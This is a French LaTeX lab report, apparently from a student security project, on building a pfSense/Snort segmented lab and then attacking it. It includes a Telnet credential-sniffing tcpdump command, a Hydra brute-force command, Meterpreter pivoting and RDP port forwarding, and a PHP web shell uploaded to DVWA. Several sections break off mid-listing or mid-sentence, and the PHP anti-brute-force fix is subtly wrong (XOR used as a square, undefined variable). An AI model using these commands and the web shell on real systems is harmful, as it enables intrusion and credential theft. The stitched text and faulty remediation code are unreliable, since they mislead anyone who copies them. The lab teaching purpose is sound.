\chapter{Infrastructure Défensive}
\label{chap:infrastructure}

\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Objectifs du Chapitre}]
Ce chapitre présente la phase fondatrice du projet : la conception et le déploiement d'une infrastructure réseau segmentée multi-couches. Nous y construisons les défenses périmètriques (pfSense), l'hôte de défense (UFW, Fail2Ban), la détection d'intrusion (Snort), et la threat intelligence (pfBlockerNG). Cette infrastructure constitue le socle sur lequel toutes les phases suivantes reposent.
\end{tcolorbox}

\section{Introduction et Objectifs Pédagogiques}
	
	\subsection{Contexte du Projet}
	Ce chapitre déploie une infrastructure segmentée (WAN/DMZ/LAN) sous VMware Workstation : pare-feu pfSense, IDS Snort, pfBlockerNG, UFW et Fail2Ban. L'infrastructure constitue le socle commun à toutes les phases suivantes.
	
	\subsection{Objectifs Techniques Détaillés}
	À l'issue de ce travail pratique, l'étudiant maîtrise :
	
	\begin{enumerate}[leftmargin=*]
		\item \textbf{Architecture Réseau :} Déployer une infrastructure VMware segmentée, configurer pfSense, appliquer routage inter-zone et NAT.
		\item \textbf{Sécurité Périmétrique :} Déployer Snort et pfBlockerNG, configurer des règles firewall stateful, gérer des listes de blocage IP.
		\item \textbf{Sécurité des Hôtes :} Durcissement via UFW, prévention brute-force via Fail2Ban, isolation des services via Docker.
		\item \textbf{Analyse et Validation :} Analyser des logs firewall/IDS, valider la segmentation, documenter incidents et configurations.
	\end{enumerate}
	
	\subsection{Méthodologie Employée}
	La démarche suivie respecte un cycle de vie de sécurité classique :
	\begin{description}
		\item[Conception :] Définition de la topologie, des plages IP et des politiques de sécurité.
		\item[Déploiement :] Installation des VMs sous VMware, configuration des interfaces et des services.
		\item[Durcissement :] Application des règles de pare-feu, installation des paquets de sécurité.
		\item[Test :] Scans de ports, tentatives d'intrusion, vérification des logs.
		\item[Analyse :] Corrélation des événements, rédaction du rapport.
	\end{description}

	\subsubsection{Adaptation des Systèmes d'Exploitation}
	\label{subsec:adaptation-os}
	
	Pour des raisons de disponibilité des ressources et de contraintes matérielles, 
	certaines machines ont été substituées par des équivalents fonctionnels 
	par rapport au cahier des charges initial:
	
	\begin{itemize}
		\item \textbf{Parrot Security OS au lieu de Kali Linux:} 
		Distribution Debian spécialisée en tests d'intrusion, embarquant 
		les mêmes outils (Metasploit Framework, Nmap, Burp Suite, etc.). 
		Fonctionnellement équivalente pour les objectifs du laboratoire.
		
		\item \textbf{Ubuntu Server 25.04 au lieu de Metasploitable:} 
		Système moderne permettant l'installation et la conteneurisation 
		(via Docker) de services volontairement vulnérables (DVWA, Telnet, Samba). 
		Plus flexible que Metasploitable pour les configurations avancées 
		des phases ultérieures.
		
		\item \textbf{Windows XP Pro SP3 au lieu de Windows Server + Windows Client:} 
		Limitation des ressources matérielles disponibles (RAM, CPU). 
		Windows XP représente une cible LAN réaliste, simulant un environnement 
		legacy encore présent dans certaines infrastructures industrielles.
		
		% ============================================
		% AJOUTER CE 4ÈME POINT ICI
		% ============================================
		
		\item \textbf{VMware Workstation 17 Pro au lieu de VirtualBox:}
		Utilisation de l'hyperviseur VMware disponible dans l'environnement 
		de laboratoire. Les concepts de segmentation réseau restent identiques: 
		les \textit{LAN Segments} de VMware (\texttt{DMZ\_SEG}, \texttt{LAN\_SEG}) 
		sont fonctionnellement équivalents aux \textit{Internal Networks} de 
		VirtualBox (\texttt{dmz-net}, \texttt{lan-net}). Les deux mécanismes 
		créent des commutateurs virtuels isolés permettant la communication 
		entre VMs d'un même segment tout en les isolant des autres segments.
		
	\end{itemize}
	
	\textbf{Impact sur les objectifs pédagogiques:} Ces substitutions 
	n'altèrent pas les concepts fondamentaux enseignés (segmentation réseau, 
	filtrage pare-feu, défense en profondeur). La topologie WAN/DMZ/LAN 
	et les mécanismes de sécurité restent identiques.
	
	
	\subsection{Segmentation Réseau}
	Le réseau est divisé en trois zones distinctes, chacune ayant un niveau de confiance spécifique :
	
	\subsubsection{Zone WAN (Wide Area Network)}
	\begin{itemize}
		\item \textbf{Rôle :} Interface externe, point d'entrée du trafic Internet.
		\item \textbf{Sous-réseau :} $192.168.100.0/24$
		\item \textbf{Passerelle :} Fournisseur d'accès Internet (simulé).
		\item \textbf{Machines :} Parrot Security (Attaquant), Interface WAN de pfSense.
		\item \textbf{Politique :} Zone non fiable, tout trafic entrant est bloqué par défaut sauf exceptions explicites.
	\end{itemize}
	
	\subsubsection{Zone DMZ (Demilitarized Zone)}
	\begin{itemize}
		\item \textbf{Rôle :} Zone tampon pour services exposés (Web, Samba).
		\item \textbf{Sous-réseau :} $192.168.10.0/24$
		\item \textbf{Passerelle :} 192.168.10.1 (pfSense)
		\item \textbf{Machines :} Ubuntu Server (Docker Host).
		\item \textbf{Politique :} Zone à faible confiance, isolation stricte du LAN.
		\item \textbf{Segment VMware :} DMZ\_SEG (LAN Segment)  % <--- AJOUT
	\end{itemize}
	
	\subsubsection{Zone LAN (Local Area Network)}
	\begin{itemize}
		\item \textbf{Rôle :} Réseau interne sécurisé, ressources critiques.
		\item \textbf{Sous-réseau :} $192.168.20.0/24$
		\item \textbf{Passerelle :} 192.168.20.1 (pfSense)
		\item \textbf{Machines :} Windows XP Professional.
		\item \textbf{Politique :} Zone de haute confiance, accès restreint depuis la DMZ.
		\item \textbf{Segment VMware :} LAN\_SEG (LAN Segment)  % <--- AJOUT
	\end{itemize}

	\section{Configuration du Service Telnet (DMZ)}
	
	\subsection{Contexte et Justification}
	Le protocole Telnet (Telecommunication Network Protocol) est un protocole de communication en mode texte utilisé pour l'accès distant aux systèmes. Bien que largement remplacé par SSH en raison de l'absence de chiffrement, Telnet reste pertinent dans un contexte pédagogique pour :
	
	\begin{itemize}
		\item Démontrer les risques liés aux protocoles en clair.
		\item Illustrer la configuration de services réseau classiques.
		\item Servir de cible contrôlée pour les tests d'intrusion.
	\end{itemize}
	
	\textbf{Note de Sécurité :} Telnet transmet les identifiants et données en clair. Son utilisation en production est \textbf{fortement déconseillée}. Ce déploiement est strictement limité à l'environnement de laboratoire isolé.
	
	\subsection{Installation du Serveur Telnet}
	
	\subsubsection{Mise à Jour du Système}
	Avant toute installation, les dépôts de paquets ont été mis à jour :
	
	\begin{lstlisting}[caption=Mise à jour des paquets système]
		ubuntuserver@DMZ-WebServer:~$ sudo apt update
		Hit:1 http://security.ubuntu.com/ubuntu plucky-security InRelease
		Hit:2 http://archive.ubuntu.com/ubuntu plucky InRelease
		All packages are up to date.
	\end{lstlisting}
	
	\subsubsection{Installation du Package Telnetd}
	Le paquet \texttt{telnetd} a été installé, entraînant l'installation automatique des dépendances :
	
	\begin{lstlisting}[caption=Installation de Telnet Server]
		ubuntuserver@DMZ-WebServer:~$ sudo apt install telnetd
		
		The following NEW packages will be installed:
		inetutils-inetd inetutils-telnetd tcpd telnetd update-inetd
		
		5 upgraded, 5 newly installed
	\end{lstlisting}
	
	\textbf{Composants Installés :}
	\begin{itemize}
		\item \textbf{telnetd :} Meta-paquet pour le serveur Telnet.
		\item \textbf{inetutils-telnetd :} Démon Telnet proprement dit.
		\item \textbf{inetutils-inetd :} Super-serveur Internet (écoute sur le port 23, spawne telnetd à la demande).
		\item \textbf{tcpd :} TCP Wrapper pour le contrôle d'accès.
		\item \textbf{update-inetd :} Outil de gestion de la configuration inetd.
	\end{itemize}
	
	\subsection{Configuration du Service}
	
	\subsubsection{Activation dans inetd.conf}
	Par défaut, le service Telnet est désactivé (commenté) dans le fichier de configuration \texttt{/etc/inetd.conf} :
	
	\begin{lstlisting}[caption=Configuration par défaut (désactivée)]
		$ cat /etc/inetd.conf | grep telnet
		#<off># telnet	stream	tcp	nowait	root	/usr/sbin/tcpd	/usr/sbin/telnetd
	\end{lstlisting}
	
	Le service a été activé en supprimant le marqueur de commentaire :
	
	\begin{lstlisting}[caption=Activation du service Telnet]
		$ sudo sed -i 's/#<off># telnet/telnet/' /etc/inetd.conf

	\section{Configuration NAT et Port Forwarding (pfSense)}
	
	\subsection{Rappel Théorique : NAT et Port Forwarding}
	
	\subsubsection{Network Address Translation (NAT)}
	Le NAT est une technique de remappage d'adresses IP permettant à plusieurs hôtes d'un réseau privé de partager une adresse IP publique pour accéder à Internet. Il fonctionne en modifiant les en-têtes des paquets IP au niveau du routeur/pare-feu.
	
	\textbf{Types de NAT :}
	\begin{itemize}
		\item \textbf{SNAT (Source NAT) :} Modifie l'adresse source (LAN → WAN).
		\item \textbf{DNAT (Destination NAT) :} Modifie l'adresse de destination (WAN → LAN/DMZ).
	\end{itemize}
	
	\subsubsection{Port Forwarding}
	Le Port Forwarding est une application du DNAT qui redirige le trafic entrant d'un port spécifique vers une machine et un port internes. C'est le mécanisme clé pour :
	
	\begin{enumerate}
		\item \textbf{Masquer la topologie interne :} L'attaquant voit l'IP publique du pare-feu, pas les IP privées des serveurs.
		\item \textbf{Réduire la surface d'attaque :} Seuls les ports explicitement forwardés sont accessibles.
		\item \textbf{Centraliser le contrôle :} Toutes les connexions passent par pfSense, facilitant l'audit et le filtrage.
	\end{enumerate}

	\subsection{Flux de Traitement des Paquets}
	Lorsqu'un client externe (Parrot Security, 192.168.100.150) se connecte au service Telnet :
	
	\begin{enumerate}
		\item \textbf{Client envoie :} \texttt{SRC: 192.168.100.150:45796 → DST: 192.168.100.6:23}
		\item \textbf{pfSense reçoit} le paquet sur l'interface WAN.
		\item \textbf{Règle Firewall :} Vérifie si le trafic est autorisé (règle NAT associée → PASS).
		\item \textbf{Table NAT :} Recherche une règle correspondant à (WAN:23).
		\item \textbf{Translation :} Réécrit le paquet : \texttt{DST: 192.168.10.100:23}
		\item \textbf{Routage :} Transmet le paquet vers l'interface DMZ.
		\item \textbf{Serveur Ubuntu} reçoit le paquet, répond avec SYN-ACK.
		\item \textbf{pfSense reverse NAT :} Réécrit la réponse : \texttt{SRC: 192.168.100.6:23}
		\item \textbf{Client reçoit} la réponse, établit la connexion TCP.
	\end{enumerate}
	
	\textbf{Résultat pour l'attaquant :} Il pense communiquer avec 192.168.100.6, ignorant l'existence de 192.168.10.100.

	\subsection{Définition et Contexte}
	La \textbf{surface d'attaque} (Attack Surface) représente l'ensemble des vecteurs par lesquels un attaquant peut tenter de pénétrer un système ou un réseau. Elle inclut :
	
	\begin{itemize}
		\item \textbf{Ports réseau ouverts :} Services accessibles depuis l'extérieur.
		\item \textbf{Interfaces d'application :} APIs, formulaires web, uploads de fichiers.
		\item \textbf{Comptes utilisateurs :} Points d'authentification (SSH, Telnet, RDP).
		\item \textbf{Vulnérabilités logicielles :} CVEs exploitables dans les services exposés.
	\end{itemize}

	\subsection{Telnet (Port 23) --- CVSS 9.8 : Critique}
	\label{subsec:telnet-cvss}

	\begin{tcolorbox}[colback=accent!10!white, colframe=accent, title=\textbf{CRITIQUE --- CVSS 9.8 (Network/None/None/Changed/High/High/High)}]
		\textbf{Service :} GNU Inetutils Telnetd | \textbf{Port :} 23/TCP | \textbf{État :} Open (WAN-accessible)
	\end{tcolorbox}

	\subsubsection{Description Technique}
	Telnet est un protocole de communication réseau datant de 1969 (RFC 854). Il établit une session de terminal interactive entre un client et un serveur. La faille fondamentale de Telnet est la \textbf{transmission de toutes les données en clair}, y compris les identifiants d'authentification.

	\subsubsection{Vecteurs d'Attaque}
	\begin{enumerate}
		\item \textbf{Credential Sniffing :} Un attaquant positionné en Man-in-the-Middle (sur le même segment réseau ou via ARP spoofing) peut capturer les identifiants en clair avec Wireshark ou tcpdump.
		\begin{lstlisting}[caption=Capture des credentials Telnet avec tcpdump]
sudo tcpdump -i eth0 port 23 -A -l | grep -i "login\|password\|user"
		\end{lstlisting}

		\item \textbf{Brute-Force :} L'absence de protection contre les tentatives multiples (Fail2Ban non configuré pour Telnet) permet les attaques de force brute.
		\begin{lstlisting}[caption=Brute-force Telnet avec Hydra]
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://192.168.100.6
		\end{lstlisting}

		\item \textbf{Replay Attack :} Les sessions capturées peuvent être rejouées pour obtenir un accès non autorisé sans connaître le mot de passe.
	\end{enumerate}

	\subsubsection{Impact de la Compromission}
	\begin{itemize}
		\item \textbf{Confidentialité :} HIGH --- Identifiants et données de session exposés en clair.
		\item \textbf{Intégrité :} HIGH --- Possibilité de modifier des commandes en transit (MitM).
		\item \textbf{Disponibilité :} HIGH --- Accès root possible, arrêt de services ou suppression de fichiers.
	\end{itemize}

	\subsubsection{Remédiation Recommandée}
	\begin{enumerate}
		\item \textbf{Désactiver Telnet immédiatement :}
		\begin{lstlisting}[caption=Désactivation du service Telnet]
sudo systemctl stop inetutils-inetd
sudo systemctl disable inetutils-inetd
sudo apt remove --purge inetutils-inetd -y
		\end{lstlisting}

		\item \textbf{Migrer vers SSH :} Utiliser le port forwarding NAT vers SSH (port 22) avec authentification par clé publique uniquement.

		\item \textbf{Activer Fail2Ban pour SSH :}
		\begin{lstlisting}[caption=Configuration Fail2Ban pour SSH]
# /etc/fail2ban/jail.local
[sshd]
enabled = true
maxretry = 3
bantime = 3600
findtime = 600
		\end{lstlisting}
	\end{enumerate}

	\subsection{Samba (Ports 139/445) --- Vulnérabilités Historiques}
	\label{subsec:samba-cvss}

	\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{AVERTISSEMENT : Ports closed mais règles NAT présentes}]
		Lors du scan Nmap, les ports 139 et 445 ont été détectés en état \textbf{closed} (service inactif). Cependant, des règles NAT existent dans pfSense (configurées à la Phase 1). Si le service Samba venait à être démarré, ces ports seraient exposés au WAN --- d'où l'importance d'une analyse préventive.
	\end{tcolorbox}

	\subsubsection{Risque dans Notre Contexte}
	\begin{itemize}
		\item \textbf{EternalBlue (MS17-010) :} Bien que ciblant SMBv1 sur Windows, des variantes Linux existent. Si Samba était actif et accessible, une tentative d'exploitation serait probable (comme observé en Phase 3 avec Windows XP).
		\item \textbf{usermap\_script :} La version de Samba utilisée dans notre Docker image doit être vérifiée. Si vulnérable, un attaquant pourrait obtenir un shell root sans authentification.
		\item \textbf{Ports ``closed'' vs ``filtered'' :} L'état ``closed'' révèle l'existence de règles NAT, informant l'attaquant qu'un service SMB peut exister (même si inactif).
	\end{itemize}

	\subsubsection{Remédiation Recommandée}
	\begin{enumerate}
		\item \textbf{Supprimer les règles NAT inutilisées :} Si Samba n'est pas nécessaire depuis le WAN, supprimer les règles de port forwarding pour les ports 139/445.
		\item \textbf{Désactiver SMBv1 :} Si Samba doit rester actif, désactiver SMBv1 dans \texttt{/etc/samba/smb.conf} :
		\begin{lstlisting}[caption=Désactivation SMBv1 dans Samba]
[global]
   min protocol = SMB2
   server min protocol = SMB2
		\end{lstlisting}
		\item \textbf{Mettre à jour Samba :} Maintenir Samba à jour pour bénéficier des correctifs de sécurité.
		\item \textbf{Restreindre l'accès réseau :} Limiter l'accès Samba au LAN uniquement via des règles pfSense strictes.
	\end{enumerate}

\section{Introduction et Contexte Opérationnel}
	
	\subsection{Contexte du Projet}
	
	Cette phase valide pratiquement les vulnérabilités identifiées lors de la Phase 2 : le service Telnet (port 23, CVSS 9.8) sert de vecteur d'accès initial. Après compromission du serveur DMZ, deux techniques avancées sont démontrées : le \textbf{pivoting réseau} (utiliser un hôte compromis comme point de rebond vers le LAN) et le \textbf{mouvement latéral} (atteindre Windows XP en zone LAN).
	
	\subsubsection{Architecture Cible}
	
	L'infrastructure est celle déployée en Phase 1 et configurée en Phase 2 :
	\begin{itemize}
		\item \textbf{Zone WAN} (192.168.100.0/24) : Parrot Security OS — machine attaquante
		\item \textbf{Zone DMZ} (192.168.10.0/24) : Ubuntu Server exposant Telnet (port 23), HTTP (80), SMB (139/445)
		\item \textbf{Zone LAN} (192.168.20.0/24) : Windows XP SP3 — cible secondaire via pivot
		\item \textbf{pfSense 2.8.0} : Segmentation stricte entre zones, règles de blocage par défaut
	\end{itemize}
	
	\subsection{Objectifs Pédagogiques}
	
	À l'issue de ce travail pratique, l'étudiant maîtrise :
	
	\begin{enumerate}[leftmargin=*]
		\item \textbf{Compromission initiale :} Exploiter Telnet (CVSS 9.8) pour obtenir un accès initial.
		\item \textbf{Post-exploitation :} Migrer vers Meterpreter, maintenir un canal C2, énumérer le système.
		\item \textbf{Pivoting réseau :} Configurer des routes Metasploit pour atteindre le LAN via l'hôte compromis.
		\item \textbf{Reconnaissance latérale :} Scanner le LAN à travers le pivot, identifier Windows XP (SMB/RDP).
		\item \textbf{Exploitation avancée :} Tester MS08-067, MS17-010 ; comprendre les mécanismes DEP/patches.
		\item \textbf{Collecte d'intelligence :} Exfiltrer des données (comptes, configs) via modules post-exploitation.
		\item \textbf{Documentation :} Rédiger des preuves techniques et formuler des recommandations de remédiation.
	\end{enumerate}
	
	\subsection{Cadre Éthique et Légal}
	
	\begin{tcolorbox}[colback=accent!5!white, colframe=accent, title=\textbf{AVERTISSEMENT LÉGAL}]

	\begin{itemize}
		\item Pas de chiffrement (trafic visible en clair).

	\section{Phase 3 : Configuration du Pivot Réseau}
	
	\subsection{Contexte et Objectif}
	
	À ce stade, nous contrôlons le serveur Ubuntu DMZ (192.168.10.100). Cependant, notre objectif final est d'atteindre le réseau LAN (192.168.20.0/24) où se trouve une machine Windows XP potentiellement vulnérable.
	
	\textbf{Problème :} Depuis notre machine attaquante (Parrot - 192.168.100.150), nous ne pouvons pas atteindre directement le réseau LAN car :
	\begin{enumerate}
		\item Le pare-feu pfSense bloque tout trafic WAN → LAN.
		\item Le réseau LAN est isolé du WAN par conception (segmentation).
	\end{enumerate}
	
	\textbf{Solution :} Utiliser le serveur DMZ compromis comme \textbf{point de pivot} (relay/gateway) pour router notre trafic vers le LAN.
	
	\subsection{Principe du Pivoting dans Metasploit}
	
	Metasploit Framework intègre un mécanisme de routage qui permet de définir des routes statiques via des sessions Meterpreter. Lorsqu'une route est ajoutée, tout le trafic Metasploit destiné au sous-réseau spécifié est automatiquement encapsulé et routé \textit{à travers} la session Meterpreter.
	
	\subsubsection{Architecture du Routage}
	
	\begin{verbatim}
		Attaquant (Parrot)  --->  Meterpreter Session  --->  Réseau LAN
		192.168.100.150          192.168.10.100 (Pivot)      192.168.20.0/24
	\end{verbatim}
	
	\subsection{Configuration de la Route}
	
	\subsubsection{Test de Connectivité Initial}
	
	Avant configuration, vérifions que le serveur DMZ peut atteindre le LAN :
	
	\begin{lstlisting}[caption=Test Ping depuis Meterpreter]

	\subsubsection{Configuration de la Règle pfSense Permissive}
	
	Pour permettre au serveur DMZ d'initier des connexions vers le réseau LAN, 
	une règle autorisant le trafic DMZ → INTERNAL\_LAN a été configurée sur pfSense. 
	
	\begin{tcolorbox}[colback=accent!5!white, colframe=accent, 
		title=\textbf{⚠️ ERREUR DE CONFIGURATION SIMULÉE}]
		
		Cette configuration représente une \textbf{violation délibérée} des bonnes 
		pratiques de segmentation réseau. En production, une telle règle constitue 
		une faille majeure permettant le mouvement latéral après compromission de la DMZ.
		
		\textbf{Principe de Sécurité Violé:} La DMZ devrait être isolée du LAN. 
		Seul le trafic LAN → DMZ devrait être autorisé (pour accéder aux services 
		publics), jamais l'inverse.
		
	\end{tcolorbox}
	
	\paragraph{Procédure de Configuration}
	
	\begin{enumerate}
		\item \textbf{Accès à l'interface pfSense:} \texttt{https://192.168.10.1}
		
		\item \textbf{Navigation:} \texttt{Firewall > Rules > DMZ}
		
		\item \textbf{Ajout d'une nouvelle règle} (bouton \texttt{Add ↑}):
		\begin{itemize}
			\item \textbf{Action:} Pass
			\item \textbf{Interface:} DMZ
			\item \textbf{Protocol:} Any (tous protocoles)
			\item \textbf{Source:} DMZ net (192.168.10.0/24)
			\item \textbf{Destination:} INTERNAL\_LAN net (192.168.20.0/24)
			\item \textbf{Description:} "Phase 3 Pivoting Lab - DMZ to LAN Access (INSECURE)"
		\end{itemize}
		
		\item \textbf{Sauvegarde et application:}
		\begin{itemize}
			\item Clic sur \texttt{Save} en bas de la page
			\item Clic sur \texttt{Apply Changes} en haut
		\end{itemize}
	\end{enumerate}
	
	\paragraph{Impact Sécurité}
	
	\textbf{Conséquences de cette règle:}
	\begin{itemize}
		\item \textcolor{green}{\checkmark} Permet le pivoting technique (objectif pédagogique de la phase)
		\item ❌ Brise la segmentation réseau
		\item ❌ Autorise une machine compromise (DMZ) à attaquer le LAN
		\item ❌ Transforme la DMZ en tremplin vers les ressources critiques
	\end{itemize}
	
	\textbf{Validation:} Cette règle explique pourquoi le test ping précédent 
	(192.168.10.100 → 192.168.20.50) a réussi. Sans cette règle, pfSense 
	bloquerait tout trafic DMZ → LAN par défaut.

	laboratoire pédagogiques mais constituerait une vulnérabilité en production.

\subsection{Configuration de Tunnels (Port Forwarding)}

En l'absence d'exploitation directe réussie, nous démontrons une technique avancée de post-exploitation : le \textbf{port forwarding} (redirection de ports).

\subsubsection{Principe du Port Forwarding}

Le port forwarding via Meterpreter permet d'exposer un service réseau interne (accessible uniquement depuis le pivot) sur la machine attaquante locale. Cela transforme le système compromis en \textit{reverse proxy}.

\textbf{Architecture :}
\begin{verbatim}
	Attacker:3389  <--->  Meterpreter  <--->  192.168.20.50:3389 (RDP)
	(Local)                (Pivot)            (Remote)
\end{verbatim}

\subsubsection{Configuration du Tunnel RDP}

\begin{lstlisting}[caption=Création du Port Forward]
	[msf](Jobs:0 Agents:1) >> sessions -i 2
	[*] Starting interaction with 2...
	
	(Meterpreter 2)(/tmp) > portfwd add -l 3389 -p 3389 -r 192.168.20.50
	[*] Forward TCP relay created: (local) :3389 -> (remote) 192.168.20.50:3389
	
	(Meterpreter 2)(/tmp) > portfwd list
	
	Active Port Forwards
	====================
	
	Index  Local         Remote              Direction
	-----  -----         ------              ---------
	1      0.0.0.0:3389  192.168.20.50:3389  Forward
	
	1 total active port forwards.
\end{lstlisting}

\subsubsection{Validation du Tunnel}

\begin{lstlisting}[caption=Test de Connectivité via Netcat]
	$ nc -zv localhost 3389
	nc: connect to localhost (::1) port 3389 (tcp) failed: Connection refused
	Connection to localhost (127.0.0.1) 3389 port [tcp/ms-wbt-server] succeeded!
\end{lstlisting}

\textcolor{green}{\checkmark} \textbf{Succès !} Le service RDP de Windows XP (192.168.20.50:3389) est maintenant accessible localement sur l'attaquant via \texttt{localhost:3389}.

\textbf{Implications :}
\begin{itemize}
	\item Un attaquant peut désormais utiliser un client RDP (xfreerdp, rdesktop) pour tenter de se connecter.
	\item Le tunnel est chiffré (via Meterpreter TLS), rendant l'activité difficile à détecter.
	\item Cette technique contourne les règles de pare-feu qui bloquent normalement WAN → LAN.
\end{itemize}

	\section{Fondements Théoriques : Pare-feu vs IDS/IPS}
	
	\subsection{Pare-feu : Filtrage L3/L4}
	
	Un pare-feu traditionnel applique des règles de filtrage principalement basées sur les en-têtes réseau (\textbf{couches 3 et 4 du modèle OSI}) :
	\begin{itemize}
		\item adresses IP (source/destination),
		\item ports (source/destination),
		\item protocoles (TCP/UDP/ICMP),
		\item état des connexions.
	\end{itemize}
	
	Ainsi, si un flux est autorisé (ex : trafic SMB DMZ $\rightarrow$ LAN via une règle permissive), le pare-feu ne caractérise pas nécessairement le contenu comme malveillant.
	
	\subsection{IDS et IPS : Inspection approfondie (DPI)}
	
	\subsubsection{IDS (Intrusion Detection System)}
	Un IDS inspecte le trafic (\textbf{Deep Packet Inspection}) et génère des alertes dès qu'une signature correspond à un motif d'attaque connu. Il s'agit d'une défense \textbf{passive} : détection, journalisation, alerte.
	
	\subsubsection{IPS (Intrusion Prevention System)}
	Un IPS effectue la même inspection, mais peut \textbf{bloquer activement} le trafic (drop, reset, blocage IP). Il s'agit d'une défense \textbf{active} mais plus risquée en cas de faux positifs.
	
	\subsubsection{Comparaison synthétique}
	\begin{table}[H]
		\centering
		\renewcommand{\arraystretch}{1.5}
		\setlength{\arrayrulewidth}{0.5pt}
		\begin{tabular}{p{3cm} p{5.3cm} p{5.3cm}}
			\arrayrulecolor{tableborder}
			\hline
			\tableheadcolor
			\textcolor{tableheadfg}{\textbf{Technologie}} &
			\textcolor{tableheadfg}{\textbf{Principe}} &
			\textcolor{tableheadfg}{\textbf{Limites}} \\
			\hline
			\rowcolor{tablerowalt}
			Pare-feu &

	\subsection{Signatures Snort : Reconnaître l'ennemi}
	
	Snort compare en temps réel les flux réseau à une base de règles (signatures). Chaque règle est identifiée par un \textbf{SID} et contient :
	\begin{itemize}
		\item critères de correspondance (protocoles, ports, contenu),
		\item message (description),
		\item priorité (sévérité),
		\item classification.
	\end{itemize}
	
	\textbf{Limite :} la détection par signatures est très efficace sur les attaques connues, mais moins sur les attaques inconnues (zero-day) ou chiffrées.
	
	\subsection{Faux Positifs}
	Un \textit{faux positif} correspond à une alerte générée sur une activité légitime. Les conséquences :
	\begin{itemize}
		\item fatigue d'alerte,
		\item perte de temps d'analyse,
		\item risque de manquer une vraie attaque (faux négatif par distraction),
		\item en mode IPS : risque de coupure de service.
	\end{itemize}
	
	Le \textbf{tuning} consiste à ajuster catégories, seuils, listes de suppression, et exceptions pour réduire le bruit.

	\section{Validation : Détection WAN vs Mouvement Latéral LAN}
	
	\subsection{Principe de la démonstration ``Avant / Après''}
	
	L'objectif est de reproduire des événements similaires à ceux de la Phase 3 et de vérifier que :
	\begin{itemize}
		\item un pare-feu seul ne fournit pas de contexte sur le contenu d'une attaque,
		\item Snort déclenche des alertes grâce à ses signatures,
		\item les alertes permettent de corréler \textbf{source}, \textbf{destination}, \textbf{ports} et \textbf{type d'attaque}.

	\subsection{Discussion : pare-feu vs Snort (visibilité)}
	
	\subsubsection{Ce que le pare-feu voit}
	Le pare-feu pfSense enregistre qu'un flux a été autorisé entre deux zones selon des règles (IP/ports). Toutefois, un flux autorisé ne signifie pas que son contenu est légitime.
	
	\subsubsection{Ce que Snort apporte}
	Snort inspecte la charge utile (DPI), compare à des signatures, et produit :
	\begin{itemize}
		\item un horodatage précis,
		\item une classification,
		\item une priorité,
		\item un message décrivant la menace,
		\item un SID permettant l'identification reproductible.
	\end{itemize}
	
	\subsection{Faux positifs observés et tuning}
	
	Les logs montrent des alertes \texttt{http\_inspect} et des règles de \textit{policy} qui peuvent apparaître en trafic normal, par exemple :
	\begin{itemize}
		\item \texttt{(http\_inspect) NO CONTENT-LENGTH OR TRANSFER-ENCODING IN HTTP RESPONSE}
		\item \texttt{ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management}
	\end{itemize}
	
	\textbf{Approche de tuning recommandée :}
	\begin{enumerate}[leftmargin=*]
		\item Activer uniquement les catégories pertinentes (scan/exploit/samba/web).
		\item Utiliser \textbf{Suppress List} pour des signatures trop bruyantes si elles sont jugées bénignes.
		\item Ajouter des exceptions (\textbf{Pass Lists / IP Lists}) pour des services légitimes.
		\item Envisager l'activation du mode IPS uniquement après stabilisation du tuning.
	\end{enumerate}

	\subsection{A05: Injection - SQL Injection}
	
	\subsubsection{Description de la Vulnérabilité}
	
	SQL Injection est une technique d'attaque qui consiste à injecter du code SQL malveillant

	\subsection{A07: Authentication Failures - Brute Force Login}
	
	\subsubsection{Description}
	
	L'absence de mécanisme de verrouillage de compte ou de limitation de débit 
	permet les attaques par force brute illimitées contre les identifiants.
	
	\subsubsection{Exploitation}
	
	\begin{enumerate}
		\item Accéder au formulaire de login DVWA
		\item Tenter plusieurs combinaisons de mots de passe :
		\begin{itemize}
			\item \texttt{admin} / \texttt{admin} → Échoue
			\item \texttt{admin} / \texttt{password} → \textbf{SUCCÈS}
		\end{itemize}
		\item Aucun message d'erreur "Compte verrouillé"
		\item Aucun délai progressif entre les tentatives
	\end{enumerate}
	
	\subsubsection{Résultats}
	
	\textbf{Observation Critique :} Après 10+ tentatives échouées, l'application 
	continue d'accepter les tentatives de login sans aucune restriction. 
	Cela démontre l'absence totale de protection anti-brute-force.
	
	\subsubsection{Impact}
	
	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
		title=\textbf{CRITICITÉ: HAUTE}]
		\begin{itemize}
			\item Attaquant peut automatiser les tentatives de crack de mots de passe
			\item Efficace contre les mots de passe faibles ou courants
			\item Aucune détection d'attaque possible (pas de logs d'alerte)
		\end{itemize}
	\end{tcolorbox}

	\subsubsection{Remédiation}
	
	\begin{lstlisting}[language=php,caption=Implémentation de Protection Anti-Brute-Force]
		// Enregistrer les tentatives échouées
		function log_failed_attempt($username, $ip) {
			// Incrémenter compteur dans Redis/Memcache
			$key = "failed_login:{$username}:{$ip}";
			$redis->incr($key);
			$redis->expire($key, 900); // 15 minutes
			
			// Vérifier le seuil
			if ($redis->get($key) >= 5) {
				throw new Exception("Trop de tentatives. Compte verrouillé 15 min.");
			}
		}
		
		// Ajouter délai progressif
		usleep(($failed_attempts ^ 2) * 1000000); // 1, 4, 9... secondes
	\end{lstlisting}

	\subsection{A08: Software or Data Integrity - File Upload}
	
	\subsubsection{Description}
	
	L'absence de validation stricte des fichiers uploadés permet l'insertion 
	de code exécutable sur le serveur, conduisant à une compromission complète.
	
	\subsubsection{Exploitation}
	
	\begin{enumerate}
		\item Créer un fichier PHP malveillant :
		\begin{lstlisting}[language=php,numbers=none,caption=Web Shell PHP,frame=none]
			<?php system($_GET['cmd']); ?>
		\end{lstlisting}
		\item Accéder à : \textbf{Vulnerabilities → File Upload}
		\item Sélectionner le fichier \texttt{shell.php}
		\item Cliquer \textbf{Upload}
	\end{enumerate}
	
	\subsubsection{Résultats}
	
	\begin{lstlisting}[caption=Confirmation d'Upload Réussi,style=logstyle]
		../../hackable/uploads/shell.php successfully uploaded!
	\end{lstlisting}
	
	\subsubsection{Exécution de Commandes}
	
	Accéder à l'URL : \texttt{http://192.168.10.100:8080/DVWA/uploads/shell.php?cmd=whoami}
	
	\textbf{Résultat :} \texttt{www-data} — Exécution en tant que serveur web confirmée.
	
	\subsubsection{Impact}
	
	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
		title=\textbf{CRITICITÉ: CRITIQUE}]
